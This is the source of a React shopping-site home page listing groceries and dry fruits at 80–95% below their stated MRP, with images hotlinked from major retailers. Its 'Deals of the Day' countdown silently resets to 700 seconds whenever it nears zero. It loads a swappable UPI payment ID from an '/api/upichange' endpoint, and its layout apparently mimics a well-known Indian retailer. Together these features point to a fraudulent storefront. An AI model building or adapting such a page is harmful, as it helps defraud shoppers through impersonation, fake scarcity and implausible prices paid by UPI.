import Layout from '@/componets/Layout';
import { useEffect, useState } from 'react';
import { items } from "../../public/Items.json";
import { Carousel } from "react-bootstrap";
import { IoMdClock } from "react-icons/io";
import Card from '@/componets/Card';
// import "bootstrap/dist/css/bootstrap.min.css";
function Home() {
  const initialTime = 700; // 10 minutes in seconds
  const [time, setTime] = useState(initialTime);
  // // Uncomment the useEffect block to use it
  useEffect(() => {
    const timer = setInterval(() => {
      if (time <= 0) {
        clearInterval(timer);
      } else {
        setTime((prevTime) => prevTime - 1);
      }
      if (time < 10) {
        setTime(700)
      }
    }, 1000);

    return () => {
      clearInterval(timer);
    };
  }, [time]);
  const [products, setProducts] = useState([
 {
   "images": "https://m.media-amazon.com/images/I/512J1jN8WXL.jpg",
   "images1": "https://m.media-amazon.com/images/I/41uFUlhWFGL.jpg",
   "images2": "https://m.media-amazon.com/images/I/71uGRD65LXL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/51wfMh36OAL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/41tTiBL63BL.jpg",
   "Title": "(4KG - 1Kg*4) Dry Fruits Combo Pack of 4 - (Almonds, Cashews, Pistachios, Raisins) - Healthy Dry Fruit Snacks | Tasty & Delicious, Rich in Protein | High in Protein, Fiber & Boost Immunity | Real Nuts | Gluten-Free | Super Healthy Nuts",
   "mrp": "1999",
   "selling_price": "290"
  },
   {
   "Cs7ycL href 2": "https://dryfruitt.shop/product-details/eccbc87e4b5ce2fe28308fd9f2a7baf3",
   "images": "https://m.media-amazon.com/images/I/71qTlx+7CzL._SX679_PIbundle-2,TopRight,0,0_AA679SH20_.jpg",
   "images1": "https://m.media-amazon.com/images/I/71nhPCrj5TL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/71qTlx+7CzL._SX679_PIbundle-2,TopRight,0,0_AA679SH20_.jpg",
   "images3": "https://m.media-amazon.com/images/I/71nhPCrj5TL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/71qTlx+7CzL._SX679_PIbundle-2,TopRight,0,0_AA679SH20_.jpg",
   "Title": "5 Litre Jar + 1L Pouch Saffola Gold Refined Cooking oil | Power of 3 - Balance of Good Fats, Triple Anti-Oxidant System & Fortified with Vitamins | Multi-Source Edible Rice Bran & Sunflower Oil |",
  "mrp": "2999",
   "selling_price": "219"
 },
 {
   "images": "https://m.media-amazon.com/images/I/51WxTBStbcL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/51GJPSM3M0L._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/61poBdYvuAL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/51WxTBStbcL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/51GJPSM3M0L._SX679_.jpg",
   "Title": "15 Kg  Maanu Cold Pressed Groundnut Peanuts Oil | Tin Can | Kolhu/Kacchi Ghani/Chekku/Ganuga | Peanut Oil | Natural | Chemical-Free | Cold Pressed Groundnut Oil for Cooking",
   "mrp": "4599",
   "selling_price": "329"
},
   {
   "images": "https://rukminim2.flixcart.com/image/832/832/xif0q/nut-dry-fruit/z/3/0/-original-imah5b4wcdvy3fuy.jpeg?q=70",
   "images1": "https://rukminim2.flixcart.com/image/832/832/xif0q/nut-dry-fruit/q/u/z/-original-imah5b4wzf8dzfp7.jpeg?q=70",
   "images2": "https://rukminim2.flixcart.com/image/832/832/xif0q/nut-dry-fruit/z/3/0/-original-imah5b4wcdvy3fuy.jpeg?q=70",
   "images3": "https://rukminim2.flixcart.com/image/832/832/xif0q/nut-dry-fruit/q/u/z/-original-imah5b4wzf8dzfp7.jpeg?q=70",
   "images4": "https://rukminim2.flixcart.com/image/832/832/xif0q/nut-dry-fruit/z/3/0/-original-imah5b4wcdvy3fuy.jpeg?q=70",
   "Title": "(1 kg) WONDERLAND Raw California Independence Almonds Almonds (Badam)",
  "mrp": "770",
   "selling_price": "179"
 },
 {
   "images": "https://m.media-amazon.com/images/I/91vlPmt5x6L._SY741_.jpg",
   "images1": "https://m.media-amazon.com/images/I/91Na1oLkSDL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/91iiP3oBsHL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/91vlPmt5x6L._SY741_.jpg",
   "images4": "https://m.media-amazon.com/images/I/91Na1oLkSDL._SX679_.jpg",
   "Title": "Aashirvaad Shudh Chakki Atta, 5kg Pack, 100% Whole Wheat Flour, 0% Maida",
   "mrp": "999",
   "selling_price": "290"
},
   {
   "images": "https://m.media-amazon.com/images/I/71l5z0vNs3L._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/81GNvBbouhL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/71l5z0vNs3L._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/81GNvBbouhL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/71l5z0vNs3L._SX679_.jpg",
   "Title": "6kg+2kg Tide Plus Detergent Washing Powder - free | Jasmine & Rose Fragrance | Removes deep-seated Oil, Gravy, Tea Stains | 8kg, Pack of 1",
  "mrp": "999",
   "selling_price": "249"
 },
 {
   "images": "https://m.media-amazon.com/images/I/61dIRgv5Z6L._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/7162+5bZc5L._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/61vIyU76q+L._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/61dIRgv5Z6L._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/7162+5bZc5L._SX679_.jpg",
   "Title": "1Kg MJ TASTE NATURAL Cardamom  | Aromatic Spice for Culinary Excellence",
   "mrp": "4999",
   "selling_price": "293"
},
   {
   "images": "https://m.media-amazon.com/images/I/512R39+ge4L._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/91IZElZCi5L._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/91IZElZCi5L._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/512R39+ge4L._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/91IZElZCi5L._SX679_.jpg",
   "Title": "1kg Pista|Roasted Salted Pista|Crunchy Pistachios|Tasty & Healthy Nuts Dry Fruits|Rich in Protein, Fibre, Gluten Free & Low Calories|Healthy Snacks|Dry Fruit Gift Pack",
  "mrp": "1299",
   "selling_price": "239"
 },
 {
   "images": "https://www.bigbasket.com/media/uploads/p/l/40142874_4-regency-walnut-in-shell-premium.jpg",
   "images1": "https://www.bigbasket.com/media/uploads/p/l/40142874-2_4-regency-walnut-in-shell-premium.jpg",
   "images2": "https://www.bigbasket.com/media/uploads/p/l/40142874-4_3-regency-walnut-in-shell-premium.jpg",
   "images3": "https://www.bigbasket.com/media/uploads/p/l/40142874_4-regency-walnut-in-shell-premium.jpg",
   "images4": "https://www.bigbasket.com/media/uploads/p/l/40142874-2_4-regency-walnut-in-shell-premium.jpg",
   "Title": "1 KG Regency Walnut Inshell",
   "mrp": "899",
   "selling_price": "179"
},
   {
   "images": "https://m.media-amazon.com/images/I/61s5orKgmwL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/616rE8iiXsL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/61s5orKgmwL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/616rE8iiXsL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/61s5orKgmwL._SX679_.jpg",
   "Title": "5 Kg Surf Excel Easy Wash Detergent Powder",
  "mrp": "770",
   "selling_price": "151"
 },
 {
   "images": "https://m.media-amazon.com/images/I/71D7GpxoruL._SY741_.jpg",
   "images1": "https://m.media-amazon.com/images/I/71D7GpxoruL._SY741_.jpg",
   "images2": "https://m.media-amazon.com/images/I/71D7GpxoruL._SY741_.jpg",
   "images3": "https://m.media-amazon.com/images/I/71D7GpxoruL._SY741_.jpg",
   "images4": "https://m.media-amazon.com/images/I/71D7GpxoruL._SY741_.jpg",
   "Title": "5L Gemini Oil_ARIPL Gemini Refined Sunflower Oil Jar,  (West)",
   "mrp": "999",
   "selling_price": "219"
},
   {
   "images": "https://m.media-amazon.com/images/I/71hYJpQ68nL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/71pVOHrz5OL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/91-q1Dht+ZL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/71hYJpQ68nL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/71pVOHrz5OL._SX679_.jpg",
   "Title": "1 Kg | Kismish | Premium Dried Grapes | Sweet Fruity Taste and Soft Chewy Texture | Natural Source of Antioxidants, Potassium & Fiber | Healthy Snack",
  "mrp": "599",
   "selling_price": "149"
 },
 {
   "images": "https://m.media-amazon.com/images/I/81y1MDgIowL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/913KZeNBNAL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/915V9jMCMlL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/81y1MDgIowL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/913KZeNBNAL._SX679_.jpg",
   "Title": "NUTRI MIRACLE Makar Sankranti Gift Hamper for Office Clients and Staff",
   "mrp": "1999",
   "selling_price": "221"
},
   {
   "images": "https://m.media-amazon.com/images/I/81oRsFhyHQL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/71ov5aaiqKL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/81oRsFhyHQL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/71ov5aaiqKL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/81oRsFhyHQL._SX679_.jpg",
   "Title": "1Kg- Vedaka Premium Black Raisins | Kali Kishmish",
  "mrp": "599",
   "selling_price": "199"
 },
 {
   "images": "https://m.media-amazon.com/images/I/81QySgRmaoL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/81g+poYGoeL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/81RfwdokimL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/81ox1vaQfEL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/81QySgRmaoL._SX679_.jpg",
   "Title": "5 kg Unpolished Yellow Moong Dal | | Naturally Rich in Protein | Naturally Cholesterol free",
   "mrp": "999",
   "selling_price": "189"
},
   {
   "images": "https://m.media-amazon.com/images/I/71QY0q0LALL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/41YZgwYaSbL.jpg",
   "images2": "https://m.media-amazon.com/images/I/7195XmbAvgS._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/71QY0q0LALL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/41YZgwYaSbL.jpg",
   "Title": "(1KG)Organic Basket Premium Afghani Anjeer (Dried Figs)",
  "mrp": "799",
   "selling_price": "191"
 },
 {
   "images": "https://m.media-amazon.com/images/I/81B15jXiqDL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/71WMs30qtEL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/71by9WFbWPL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/81B15jXiqDL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/71WMs30qtEL._SX679_.jpg",
   "Title": "5KG NUTRIGRASS California Healthy and Tasty Dry Fruit Nut Raw Almonds (Dried) -",
   "mrp": "6299",
   "selling_price": "274"
},
   {
   "images": "https://m.media-amazon.com/images/I/71V2uwn2PlL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/7161R3qu96L._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/71hdAa9gy2L._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/71V2uwn2PlL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/7161R3qu96L._SX679_.jpg",
   "Title": "2 Gram- Pack of 1 UPAKARMA Original Kashmiri Kesar/Saffron | Handpicked Pure Finest Grade |",
  "mrp": "949",
   "selling_price": "199"
 },
 {
   "images": "https://m.media-amazon.com/images/I/61TrDwrIAaL._SX679_.jpg",
   "images1": "https://m.media-amazon.com/images/I/71FXLJ7kNpL._SX679_.jpg",
   "images2": "https://m.media-amazon.com/images/I/51y10lQmbtL._SX679_.jpg",
   "images3": "https://m.media-amazon.com/images/I/61TrDwrIAaL._SX679_.jpg",
   "images4": "https://m.media-amazon.com/images/I/71FXLJ7kNpL._SX679_.jpg",
   "Title": "(15Liter) MOLIMORE Refined Cottonseed Oil – Pure, Light, and Perfect for Healthy Cooking",
   "mrp": "1999",
   "selling_price": "329"
},
   {
   "images": "https://m.media-amazon.com/images/I/81DxKBPX+IL._SX679_PIbundle-3,TopRight,0,0_SX679SY604SH20_.jpg",
   "images1": "https://m.media-amazon.com/images/I/81DxKBPX+IL._SX679_PIbundle-3,TopRight,0,0_SX679SY604SH20_.jpg",
   "images2": "https://m.media-amazon.com/images/I/81DxKBPX+IL._SX679_PIbundle-3,TopRight,0,0_SX679SY604SH20_.jpg",
   "images3": "https://m.media-amazon.com/images/I/81DxKBPX+IL._SX679_PIbundle-3,TopRight,0,0_SX679SY604SH20_.jpg",
   "images4": "https://m.media-amazon.com/images/I/81DxKBPX+IL._SX679_PIbundle-3,TopRight,0,0_SX679SY604SH20_.jpg",
   "Title": "3kg Goshudh Badam 1Kg, Kaju 1Kg, Pista 1Kg Combo Pack 3000g",
  "mrp": "899",
   "selling_price": "249"
 }
]);
  const [products1, setProducts1] = useState({ pixelId: "" });

  useEffect(() => {

    fetchProducts1();
  }, []);
  const fetchProducts1 = async () => {
    try {
      let headersList = {
        "Accept": "*/*",
        "User-Agent": "Thunder Client (https://www.thunderclient.com)",
        "Content-Type": "application/json",
        "Authorization": `Bearer ${localStorage.getItem("token")}`
      };

      const response = await fetch('/api/upichange', {
        method: 'GET',
        headers: headersList,
      });

      if (response.ok) {
        const data = await response.json();
        localStorage.setItem("upi", data.upi.upi)
        setProducts1(data.pixelId);
      } else {
      }
    } catch (error) {
    }

  };
  const fetchProducts = async () => {
    try {
      const response = await fetch('/api/products');
      const data = await response.json();
      setProducts(data);
    } catch (error) {
    }
  };
  useEffect(() => {
    const timer = setInterval(() => {
      if (time <= 0) {
        clearInterval(timer);
      } else {
        setTime((prevTime) => prevTime - 1);
      }
    }, 1000);

    return () => {
      clearInterval(timer);
    };
  }, [time]);

  const { bootstrap } = items;
  const [index, setIndex] = useState(0);
  const handleSelect = (selectedIndex, e) => {
    setIndex(selectedIndex);
  };
  const settings = {
    dots: true,
    infinite: true,
    speed: 500,
    slidesToShow: 1,
    slidesToScroll: 1,
  };

  return (
    <>
      <Layout data={products1}>
        <div id="container" style={{ overflow: "hidden" }}>
          <div style={{ height: "100%" }} data-reactroot="">
            <style
              dangerouslySetInnerHTML={{
                __html:
                  "\n    div {\n        font-size: 20px;\n        text-align: center;\n    }\n"
              }}
            />
            <div>
              <div className="_2dxSCm">
                <div className="_38U37R" style={{
                  backgroundColor: "#2874f0",
                }}>
                  <div>
                    <div className="_1FWdmb pt-2" style={{
                      backgroundColor: "#2874f0",
                      display: "flex",
                      justifyContent: "space-between"
                    }}>
                      <a className="_3NH1qf mx-4 my-2" style={{
                        display: "flex", width: "65%"
                      }}>
                        <svg fill="#FFF" height="36" viewBox="0 0 24 24" width="21" xmlns="http://www.w3.org/2000/svg"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
                        <a className="Z4_K_h mx-3" style={{ width: 85 }}>
                          <img
                            src="/uploads/Q18Ifxk.webp"
                            className="_31Y9yB"
                            style={{ width: 85 }}
                          />
                        </a>
                      </a>

                      <div className="_2WBW6z" />
                      <a href="#/mobile.html#" className="_3NH1qf">
                        <svg
                          width={16}
                          height={16}
                          className='mt-3'
                          viewBox="0 0 15 15"
                          xmlns="external452e452e452e452e452e.html?link=http://www.w3.org/2000/svg"
                        >
                          <g fill="#fff" fillRule="evenodd">
                            <path d="m5.189 13.04c0 .996-.791 1.804-1.767 1.804-.976 0-1.767-.808-1.767-1.804 0-.996.791-1.804 1.767-1.804.976 0 1.767.808 1.767 1.804" />
                            <path d="m14.912 2.259h-14.298l2.247 6.917c.042.129.16.216.293.216h8.06c-.064.69-.629 1.841-1.702 1.841h-6.04l1.072 1.991h5.611c1.881 0 2.938-2.278 3.657-4.719.888-3.01 1.219-6.245 1.106-6.245" />
                            <path d="m.615 2.259l-.592-1.828c-.08-.207.069-.431.287-.431h1.482c.126 0 .24.079.287.198l.682 2.061c0 0-.63 1.642-1.942.066" />
                            <path d="m2.262.756c0 0 .498 1.503 2.234 1.503l-1.736.749-1.104-.749.607-1.503" />
                            <path d="m13.424 13.325c0 .837-.664 1.516-1.484 1.516-.82 0-1.484-.679-1.484-1.516 0-.837.664-1.516 1.484-1.516.82 0 1.484.679 1.484 1.516" />
                          </g>
                        </svg>
                        <span className="_2tVMo0">1</span>
                      </a>
                    </div>
                    <div>
                      <div className="_3QNhdh " id="guidSearch">
                        <div className="ORogdv ">
                          <div className="_1k9EoO ">
                            <div className="_2d36Hu">
                              <a href="#/mobile.html#search" className="search-div">
                                <input
                                  type=""
                                  className="_1eMB9R my-1"
                                  placeholder="Search for Products, Brands and More"
                                  defaultValue=""
                                  style={{
                                    width: "92%",
                                    fontSize: 14,
                                    padding: "7px 10px",
                                    margin: 3,
                                    border: "none",
                                    borderRadius: 5
                                  }}
                                />
                              </a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <img src={"/uploads/top-bg.a2aad345a2d903ce5659.jpg"} className="img-fluid" />
                <Carousel activeIndex={index} onSelect={handleSelect}>
                  {bootstrap.map((item) => (
                    <Carousel.Item key={item.id} interval={4000}>
                      <img src={item.imageUrl} alt="slides" className='img-fluid' />
                    </Carousel.Item>
                  ))}
                </Carousel>

                <div className="_2rW-uM _3sgvr0 _1cVt6K _1CXxjX" >
                  <div className="_3LrtWH ">
                    <div className="_3QuZpZ dod-div">
                      <div className="dod-label"> Deals of the Day </div>
                      <div className="_1oETR8">
                        <div className="_1dZamR _2mmD4F">
                          <IoMdClock style={{ fontSize: 19 }} className='mx-2' />
                          <div id="test">
                            {Math.floor(time / 60)}:{time % 60}</div>
                        </div>
                      </div>
                    </div>
                    <div className="_3Nxu4r">
                      <button className="_1s54Jm btn-sale-is-live">SALE IS LIVE</button>
                    </div>
                  </div>
                </div>
                <div className='row' style={{ background: "#f1f2f4" }}>
                  {products?.length > 0 ?
                    products?.map((item, index) => {
                      if (item.mrp) {
                        return <Card key={item.id} item={item} index={index} />;
                      }
                    }) : <>
                      <img className="mt-3" src={`https://icon-library.com/images/loading-icon-animated-gif/loading-icon-animated-gif-19.jpg`} />
                    </>}

                </div>
              </div>
            </div>
          </div>
          <footer className="seofooter" id="seofooter"></footer>
        </div >
      </Layout>

    </>

  );
}

export default Home;
